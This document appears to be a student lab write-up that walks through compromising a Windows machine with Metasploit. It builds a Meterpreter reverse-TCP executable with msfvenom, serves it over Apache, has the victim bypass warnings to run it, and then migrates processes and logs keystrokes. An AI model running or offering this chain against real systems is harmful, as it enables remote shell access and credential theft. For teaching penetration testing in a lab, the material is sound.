# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="848" height="367" alt="image" src="https://github.com/user-attachments/assets/7c7948d5-7eaa-4577-853e-b1e0de061073" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="883" height="351" alt="image" src="https://github.com/user-attachments/assets/258b9e17-062e-4219-9ec4-11c31a6b25ed" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="1019" height="680" alt="image" src="https://github.com/user-attachments/assets/869ccc9f-d8bc-4f77-b0ca-6d7a0aab1b70" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="1019" height="680" alt="image" src="https://github.com/user-attachments/assets/911203f6-c4cd-4811-a46d-b5db68124b75" />


Check the status of apache2
## OUTPUT:

<img width="1007" height="690" alt="image" src="https://github.com/user-attachments/assets/10421cd8-8e45-49f2-9716-d5b99829e131" />


Invoke msfconsole:
## OUTPUT:
<img width="674" height="787" alt="image" src="https://github.com/user-attachments/assets/39d4678c-7311-43f3-a503-0fe7179e5405" />




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="747" height="775" alt="image" src="https://github.com/user-attachments/assets/8c6697ed-6497-4124-96d4-2f2f0074e187" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="1716" height="910" alt="image" src="https://github.com/user-attachments/assets/50b75f01-2812-4951-aacb-16c47685a177" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="312" height="229" alt="image" src="https://github.com/user-attachments/assets/19290e13-9058-4e14-ba4d-419781174f96" />



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
<img width="520" height="272" alt="image" src="https://github.com/user-attachments/assets/1b4ef4e4-33c4-443f-8bbc-1cc863afd0f4" />



On kali/parrot give the command exploit
## OUTPUT:
<img width="1600" height="734" alt="image" src="https://github.com/user-attachments/assets/08647193-aeea-4247-9f19-8dee0d8829d3" />



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="1600" height="734" alt="image" src="https://github.com/user-attachments/assets/381423f5-32c6-4e61-ac4e-2a61c492041b" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:
<img width="1600" height="734" alt="image" src="https://github.com/user-attachments/assets/1cb4479e-17ce-406a-9f09-62be744b751d" />


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:
<img width="1600" height="734" alt="image" src="https://github.com/user-attachments/assets/200ca09c-e4ff-4b0b-9989-907c5e4f8978" />



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:

<img width="407" height="305" alt="image" src="https://github.com/user-attachments/assets/2472473c-e0a4-4373-a151-21065c37569f" />



keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="1600" height="734" alt="image" src="https://github.com/user-attachments/assets/52f19cf0-1aac-434e-9eaf-cfaab1fa9625" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


